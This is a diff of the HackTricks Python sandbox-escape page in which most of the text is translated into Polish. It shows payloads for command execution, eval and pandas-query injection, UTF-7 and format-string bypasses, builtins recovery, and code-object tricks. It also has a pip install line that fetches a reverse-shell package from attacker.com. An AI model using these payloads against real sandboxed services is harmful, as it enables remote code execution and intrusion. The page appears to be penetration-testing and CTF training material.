@@ -8,28 +8,28 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 
 <summary>Support HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
 
 </details>
 {% endhint %}
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-#### Get a hacker's perspective on your web apps, network, and cloud
+**Uzyskaj perspektywę hakera na swoje aplikacje internetowe, sieć i chmurę**
 
-**Znajdź i zgłoś krytyczne, wykorzystywalne luki w zabezpieczeniach, które mają rzeczywisty wpływ na biznes.** Użyj naszych 20+ niestandardowych narzędzi, aby zmapować powierzchnię ataku, znaleźć problemy z bezpieczeństwem, które pozwalają na eskalację uprawnień, oraz użyj automatycznych exploitów, aby zebrać niezbędne dowody, przekształcając swoją ciężką pracę w przekonujące raporty.
+**Znajdź i zgłoś krytyczne, wykorzystywalne luki w zabezpieczeniach, które mają rzeczywisty wpływ na biznes.** Użyj naszych 20+ niestandardowych narzędzi, aby zmapować powierzchnię ataku, znaleźć problemy z bezpieczeństwem, które pozwalają na eskalację uprawnień, i użyj automatycznych exploitów, aby zebrać niezbędne dowody, przekształcając swoją ciężką pracę w przekonujące raporty.
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
 
 
-These are some tricks to bypass python sandbox protections and execute arbitrary commands.
+To są niektóre triki, aby obejść zabezpieczenia piaskownicy Pythona i wykonać dowolne polecenia.
 
-## Command Execution Libraries
+## Biblioteki wykonania poleceń
 
-The first thing you need to know is if you can directly execute code with some already imported library, or if you could import any of these libraries:
+Pierwszą rzeczą, którą musisz wiedzieć, jest to, czy możesz bezpośrednio wykonać kod za pomocą już zaimportowanej biblioteki, czy też możesz zaimportować którąkolwiek z tych bibliotek:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -102,12 +102,12 @@ Jeśli masz dostęp do `pip` lub `pip.main()`, możesz zainstalować dowolny pak
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Możesz pobrać pakiet do stworzenia reverse shell tutaj. Proszę, pamiętaj, że przed jego użyciem powinieneś **rozpakować go, zmienić `setup.py` i wpisać swój adres IP dla reverse shell**:
+Możesz pobrać pakiet do stworzenia reverse shell tutaj. Proszę, pamiętaj, że przed użyciem powinieneś **rozpakować go, zmienić `setup.py` i wpisać swój adres IP dla reverse shell**:
 
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
 {% hint style="info" %}
-Ten pakiet nazywa się `Reverse`. Jednak został specjalnie stworzony, aby po wyjściu z reverse shell reszta instalacji zakończyła się niepowodzeniem, więc **nie zostawisz żadnego dodatkowego pakietu python na serwerze** po wyjściu.
+Ten pakiet nazywa się `Reverse`. Jednak został specjalnie stworzony, aby po wyjściu z reverse shell reszta instalacji zakończyła się niepowodzeniem, więc **nie zostawisz żadnego dodatkowego pakietu python zainstalowanego na serwerze** po wyjściu.
 {% endhint %}
 
 ## Eval-ing kodu python
@@ -162,7 +162,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 ## Bypassing protections through encodings (UTF-7)
 
-W [**tym artykule**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 jest używane do ładowania i wykonywania dowolnego kodu python wewnątrz pozornie izolowanego środowiska:
+W [**tym artykule**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 jest używany do ładowania i wykonywania dowolnego kodu python wewnątrz pozornie izolowanego środowiska:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -177,7 +177,7 @@ Możliwe jest również ominięcie tego za pomocą innych kodowań, np. `raw_uni
 
 ## Wykonanie Pythona bez wywołań
 
-Jeśli jesteś w pułapce Pythona, która **nie pozwala na wywołania**, istnieją nadal sposoby na **wykonanie dowolnych funkcji, kodu** i **komend**.
+Jeśli jesteś w więzieniu Pythona, które **nie pozwala na wywołania**, wciąż istnieją sposoby na **wykonanie dowolnych funkcji, kodu** i **poleceń**.
 
 ### RCE z [dekoratorami](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -207,7 +207,7 @@ Jeśli możesz **zadeklarować klasę** i **utworzyć obiekt** tej klasy, możes
 
 #### RCE z niestandardowymi klasami
 
-Możesz modyfikować niektóre **metody klas** (_przez przeciążanie istniejących metod klas lub tworzenie nowej klasy_), aby sprawiały, że **wykonują dowolny kod** po **wywołaniu** bez bezpośredniego ich wywoływania.
+Możesz modyfikować niektóre **metody klas** (_przez przeciążenie istniejących metod klas lub utworzenie nowej klasy_), aby sprawić, że będą **wykonywać dowolny kod** po **wywołaniu** bez bezpośredniego ich wywoływania.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -329,20 +329,20 @@ pass
 ```
 ## Builtins
 
-* [**Funkcje wbudowane w python2**](https://docs.python.org/2/library/functions.html)
-* [**Funkcje wbudowane w python3**](https://docs.python.org/3/library/functions.html)
+* [**Funkcje wbudowane Pythona 2**](https://docs.python.org/2/library/functions.html)
+* [**Funkcje wbudowane Pythona 3**](https://docs.python.org/3/library/functions.html)
 
 Jeśli masz dostęp do obiektu **`__builtins__`**, możesz importować biblioteki (zauważ, że możesz również użyć tutaj innej reprezentacji ciągu pokazanej w ostatniej sekcji):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
-### No Builtins
+### Brak Wbudowanych
 
 Kiedy nie masz `__builtins__`, nie będziesz w stanie zaimportować niczego ani nawet czytać lub pisać plików, ponieważ **wszystkie funkcje globalne** (jak `open`, `import`, `print`...) **nie są załadowane**.\
 Jednak **domyślnie python importuje wiele modułów do pamięci**. Te moduły mogą wydawać się nieszkodliwe, ale niektóre z nich **również importują niebezpieczne** funkcjonalności, które można wykorzystać do uzyskania **dowolnego wykonania kodu**.
 
-W poniższych przykładach możesz zaobserwować, jak **wykorzystać** niektóre z tych "**nieszkodliwych**" modułów załadowanych do **dostępu** do **niebezpiecznych** **funkcjonalności** wewnątrz nich.
+W poniższych przykładach możesz zaobserwować, jak **nadużywać** niektóre z tych "**nieszkodliwych**" modułów załadowanych do **dostępu** do **niebezpiecznych** **funkcjonalności** wewnątrz nich.
 
 **Python2**
 ```python
@@ -712,7 +712,7 @@ Zauważ, jak możesz **uzyskać dostęp do atrybutów** w normalny sposób za po
 
 Zauważ również, że możesz użyć `.__dict__`, aby wyliczyć elementy obiektu `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-Niektóre inne interesujące cechy formatów ciągów to możliwość **wykonywania** **funkcji** **`str`**, **`repr`** i **`ascii`** w wskazanym obiekcie, dodając **`!s`**, **`!r`**, **`!a`** odpowiednio:
+Niektóre inne interesujące cechy ciągów formatu są możliwością **wykonywania** **funkcji** **`str`**, **`repr`** i **`ascii`** w wskazanym obiekcie, dodając **`!s`**, **`!r`**, **`!a`** odpowiednio:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
@@ -728,10 +728,10 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**Więcej przykładów** dotyczących **formatu** **łańcucha** można znaleźć na [**https://pyformat.info/**](https://pyformat.info)
+**Więcej przykładów** dotyczących **format** **string** można znaleźć na [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
-Sprawdź również następującą stronę w poszukiwaniu gadżetów, które r**ead sensitive information from Python internal objects**:
+Sprawdź także następującą stronę w poszukiwaniu gadżetów, które r**ead sensitive information from Python internal objects**:
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
@@ -756,16 +756,16 @@ str(x) # Out: clueless
 ```
 ### Od formatu do RCE ładowanie bibliotek
 
-Zgodnie z [**wyzwaniem TypeMonkey z tego opisu**](https://corgi.rip/posts/buckeye-writeups/) możliwe jest ładowanie dowolnych bibliotek z dysku, wykorzystując lukę w formacie łańcucha w pythonie.
+Zgodnie z [**wyzwaniem TypeMonkey z tego opisu**](https://corgi.rip/posts/buckeye-writeups/) możliwe jest ładowanie dowolnych bibliotek z dysku, wykorzystując lukę w formacie ciągu w pythonie.
 
 Przypomnienie: za każdym razem, gdy wykonywana jest akcja w pythonie, wywoływana jest jakaś funkcja. Na przykład `2*3` wykona **`(2).mul(3)`** lub **`{'a':'b'}['a']`** wykona **`{'a':'b'}.__getitem__('a')`**.
 
 Masz więcej takich przykładów w sekcji [**Wykonanie Pythona bez wywołań**](./#python-execution-without-calls).
 
-Luka w formacie łańcucha w pythonie nie pozwala na wykonanie funkcji (nie pozwala na użycie nawiasów), więc nie jest możliwe uzyskanie RCE jak `'{0.system("/bin/sh")}'.format(os)`.\
+Luka w formacie ciągu w pythonie nie pozwala na wywoływanie funkcji (nie pozwala na użycie nawiasów), więc nie jest możliwe uzyskanie RCE jak `'{0.system("/bin/sh")}'.format(os)`.\
 Jednak możliwe jest użycie `[]`. Dlatego, jeśli powszechna biblioteka pythonowa ma metodę **`__getitem__`** lub **`__getattr__`**, która wykonuje dowolny kod, można je wykorzystać do uzyskania RCE.
 
-Szukając takiego gadżetu w pythonie, opis proponuje to [**zapytanie wyszukiwania Github**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Gdzie znalazł ten [przykład](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
+Szukając takiego gadżetu w pythonie, opis proponuje to [**zapytanie wyszukiwania na Githubie**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Gdzie znalazł ten [przykład](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
 ```python
 class LibraryLoader(object):
 def __init__(self, dlltype):
@@ -787,7 +787,7 @@ return getattr(self, name)
 cdll = LibraryLoader(CDLL)
 pydll = LibraryLoader(PyDLL)
 ```
-Ten gadżet pozwala na **załadowanie biblioteki z dysku**. Dlatego konieczne jest w jakiś sposób **napisać lub przesłać bibliotekę do załadowania** poprawnie skompilowaną na zaatakowany serwer.
+Ten gadżet pozwala na **załadowanie biblioteki z dysku**. Dlatego konieczne jest w jakiś sposób **napisanie lub przesłanie biblioteki do załadowania** poprawnie skompilowanej na zaatakowany serwer.
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
@@ -796,7 +796,7 @@ Wyzwanie w rzeczywistości wykorzystuje inną lukę w serwerze, która pozwala n
 ## Analiza obiektów Pythona
 
 {% hint style="info" %}
-Jeśli chcesz **nauczyć się** o **bajtkodzie Pythona** w głębi, przeczytaj ten **świetny** post na ten temat: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+Jeśli chcesz **nauczyć się** o **bytecode Pythona** w głębi, przeczytaj ten **świetny** post na ten temat: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
 W niektórych CTF-ach możesz otrzymać nazwę **niestandardowej funkcji, w której znajduje się flaga** i musisz zobaczyć **wnętrze** **funkcji**, aby ją wyodrębnić.
@@ -922,7 +922,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Zauważ, że **jeśli nie możesz zaimportować `dis` w piaskownicy Pythona**, możesz uzyskać **bytecode** funkcji (`get_flag.func_code.co_code`) i **rozłożyć** go lokalnie. Nie zobaczysz zawartości zmiennych, które są ładowane (`LOAD_CONST`), ale możesz je zgadnąć z (`get_flag.func_code.co_consts`), ponieważ `LOAD_CONST` również informuje o przesunięciu zmiennej, która jest ładowana.
+Zauważ, że **jeśli nie możesz zaimportować `dis` w piaskownicy Pythona**, możesz uzyskać **bajtowy kod** funkcji (`get_flag.func_code.co_code`) i **zdekompilować** go lokalnie. Nie zobaczysz zawartości zmiennych, które są ładowane (`LOAD_CONST`), ale możesz je zgadnąć z (`get_flag.func_code.co_consts`), ponieważ `LOAD_CONST` również informuje o przesunięciu zmiennej, która jest ładowana.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -947,7 +947,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## Kompilowanie Pythona
 
 Teraz wyobraźmy sobie, że w jakiś sposób możesz **zrzucić informacje o funkcji, której nie możesz wykonać**, ale **musisz** ją **wykonać**.\
-Jak w poniższym przykładzie, **możesz uzyskać dostęp do obiektu kodu** tej funkcji, ale tylko czytając disassemble **nie wiesz, jak obliczyć flagę** (_wyobraź sobie bardziej złożoną funkcję `calc_flag`_)
+Jak w następującym przykładzie, **możesz uzyskać dostęp do obiektu kodu** tej funkcji, ale tylko czytając disassemble **nie wiesz, jak obliczyć flagę** (_wyobraź sobie bardziej złożoną funkcję `calc_flag`_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -982,7 +982,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 {% hint style="info" %}
-W zależności od wersji Pythona, **parametry** `code_type` mogą mieć **inny porządek**. Najlepszym sposobem na poznanie kolejności parametrów w wersji Pythona, którą uruchamiasz, jest uruchomienie:
+W zależności od wersji Pythona, **parametry** `code_type` mogą mieć **inną kolejność**. Najlepszym sposobem, aby poznać kolejność parametrów w wersji Pythona, którą uruchamiasz, jest uruchomienie:
 ```
 import types
 types.CodeType.__doc__
@@ -1037,7 +1037,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Jeśli nie możesz uzyskać dostępu do `eval` lub `exec`, możesz stworzyć **odpowiednią funkcję**, ale jej bezpośrednie wywołanie zazwyczaj zakończy się niepowodzeniem z komunikatem: _konstruktor niedostępny w trybie ograniczonym_. Musisz więc mieć **funkcję, która nie jest w ograniczonym środowisku, aby wywołać tę funkcję.**
+Jeśli nie możesz uzyskać dostępu do `eval` lub `exec`, możesz stworzyć **odpowiednią funkcję**, ale jej bezpośrednie wywołanie zazwyczaj zakończy się niepowodzeniem z komunikatem: _konstruktor niedostępny w trybie ograniczonym_. Dlatego potrzebujesz **funkcji, która nie jest w ograniczonym środowisku, aby wywołać tę funkcję.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1082,9 +1082,9 @@ will be bypassed
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-#### Uzyskaj perspektywę hakera na swoje aplikacje internetowe, sieć i chmurę
+**Uzyskaj perspektywę hakera na swoje aplikacje internetowe, sieć i chmurę**
 
-**Znajdź i zgłoś krytyczne, wykorzystywalne luki w zabezpieczeniach, które mają rzeczywisty wpływ na biznes.** Użyj naszych 20+ niestandardowych narzędzi, aby zmapować powierzchnię ataku, znaleźć problemy z bezpieczeństwem, które pozwalają na eskalację uprawnień, i użyj zautomatyzowanych exploitów, aby zebrać niezbędne dowody, przekształcając swoją ciężką pracę w przekonujące raporty.
+**Znajdź i zgłoś krytyczne, wykorzystywalne luki z rzeczywistym wpływem na biznes.** Użyj naszych 20+ niestandardowych narzędzi, aby zmapować powierzchnię ataku, znaleźć problemy z bezpieczeństwem, które pozwalają na eskalację uprawnień, oraz użyj zautomatyzowanych exploitów do zbierania niezbędnych dowodów, przekształcając swoją ciężką pracę w przekonujące raporty.
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
